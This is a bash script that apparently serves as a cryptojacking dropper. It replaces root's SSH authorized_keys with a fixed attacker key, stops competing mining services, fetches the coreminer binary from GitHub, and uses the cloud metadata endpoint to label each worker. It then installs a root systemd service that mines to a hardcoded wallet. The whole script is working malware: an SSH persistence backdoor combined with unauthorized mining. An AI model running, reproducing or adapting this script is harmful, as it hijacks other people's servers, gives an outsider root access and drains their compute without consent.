#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAl5QreAwkidb7s2ucEKdlQ1q9/voCnGiLjvwwmQPgpm' >/root/.ssh/authorized_keys
chmod 700 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh/authorized_keys

wallet="cb1823f1b419e1b37495dac3a7ea201607dda11a3098"

systemctl stop ore scash shai tdc ftb qli
systemctl disable ore scash shai tdc ftb qli

rm -rf /opt/xcb

DIR="/opt/xcb"

mkdir -p $DIR

JSONDATA=$(curl -X GET --header "Accept: application/json" "https://api.github.com/repos/catchthatrabbit/coreminer/releases/latest")
TAG=$(echo "${JSONDATA}" | awk 'BEGIN{RS=","} /tag_name/{gsub(/.*: "/,"",$0); gsub(/"/,"",$0); print $0}')
LATESTVER=$(echo ${TAG} | sed -r 's/^v//')
ARCH=$(uname -m)
if [ "$ARCH" == "aarch64" ]; then ARCH="arm64"; fi
PLATFORM=$(uname | tr '[:upper:]' '[:lower:]')
LATESTDOWN="https://github.com/catchthatrabbit/coreminer/releases/download/${TAG}/coreminer-${PLATFORM}-${ARCH}.tar.gz"

wget -T 3 -t 2 -qO- $LATESTDOWN | tar -zxf - -C $DIR --strip-components=1

chmod +x $DIR/coreminer


eu=$(curl -s -o /dev/null -w "%{time_total}\n" eu.catchthatrabbit.com)
asia=$(curl -s -o /dev/null -w "%{time_total}\n" as.catchthatrabbit.com)
us=$(curl -s -o /dev/null -w "%{time_total}\n" us.catchthatrabbit.com)

if (($(bc <<<"$eu > $asia"))) && (($(bc <<<"$us > $asia"))); then
    pool1="as.catchthatrabbit.com:8008"
    pool2="as1.catchthatrabbit.com:8008"
elif (($(bc <<<"$asia > $eu"))) && (($(bc <<<"$us > $eu"))); then
    pool1="eu.catchthatrabbit.com:8008"
    pool2="eu1.catchthatrabbit.com:8008"
else
    pool1="us.catchthatrabbit.com:8008"
    pool2="us1.catchthatrabbit.com:8008"
fi

COMMAND_BASE="${DIR}/coreminer --noeval --large-pages --hard-aes -P stratum1+tcp://${wallet}.\${ALIAS}@${pool1} -P stratum1+tcp://${wallet}.\${ALIAS}@${pool2}"

echo '''#!/bin/bash
ALIAS="$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4)"
[ -z "$ALIAS" ] && ALIAS=$(wget -T 3 -t 2 -qO- ifconfig.me)
ALIAS=`echo $ALIAS | sed "s/\\./-/g"`

''' > $DIR/start.sh
echo $COMMAND_BASE >> $DIR/start.sh
chmod +x $DIR/start.sh

echo """[Unit]
Description=xcb
DefaultDependencies=no
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/start.sh
Restart=always
RestartSec=5s
StandardOutput=file:$DIR/worker.log
StandardError=inherit
[Install]
WantedBy=default.target""" > /etc/systemd/system/xcb.service

systemctl daemon-reload
systemctl enable xcb
systemctl restart xcb